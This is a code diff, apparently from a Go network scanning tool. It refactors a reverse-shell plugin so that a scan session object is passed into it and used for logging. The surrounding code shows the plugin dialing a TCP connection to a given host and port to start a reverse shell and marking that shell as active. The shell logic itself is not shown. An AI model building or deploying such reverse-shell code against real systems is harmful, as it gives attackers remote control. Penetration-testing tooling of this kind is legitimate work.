@@ -68,7 +68,7 @@ func (p *ReverseShellPlugin) Scan(ctx context.Context, info *common.HostInfo, se
 	output.WriteString(i18n.Tr("local_platform", runtime.GOOS) + "\n\n")
 
 	// 启动反弹Shell
-	err = p.startNativeReverseShell(ctx, host, port, state)
+	err = p.startNativeReverseShell(ctx, host, port, state, session)
 	if err != nil {
 		output.WriteString(i18n.Tr("reverseshell_error", err) + "\n")
 		return &plugins.Result{
@@ -79,7 +79,7 @@ func (p *ReverseShellPlugin) Scan(ctx context.Context, info *common.HostInfo, se
 	}
 
 	output.WriteString(i18n.GetText("reverseshell_done") + "\n")
-	common.LogSuccess(i18n.Tr("reverseshell_complete", target))
+	session.LogSuccess(i18n.Tr("reverseshell_complete", target))
 
 	return &plugins.Result{
 		Success: true,
@@ -90,7 +90,7 @@ func (p *ReverseShellPlugin) Scan(ctx context.Context, info *common.HostInfo, se
 }
 
 // startNativeReverseShell 启动Go原生反弹Shell
-func (p *ReverseShellPlugin) startNativeReverseShell(ctx context.Context, host string, port int, state *common.State) error {
+func (p *ReverseShellPlugin) startNativeReverseShell(ctx context.Context, host string, port int, state *common.State, session *common.ScanSession) error {
 	// 连接到目标
 	conn, err := net.Dial("tcp", net.JoinHostPort(host, strconv.Itoa(port)))
 	if err != nil {
@@ -98,7 +98,7 @@ func (p *ReverseShellPlugin) startNativeReverseShell(ctx context.Context, host s
 	}
 	defer func() { _ = conn.Close() }()
 
-	common.LogSuccess(i18n.Tr("reverseshell_connected", host, port))
+	session.LogSuccess(i18n.Tr("reverseshell_connected", host, port))
 
 	// 设置反弹Shell为活跃状态
 	state.SetReverseShellActive(true)
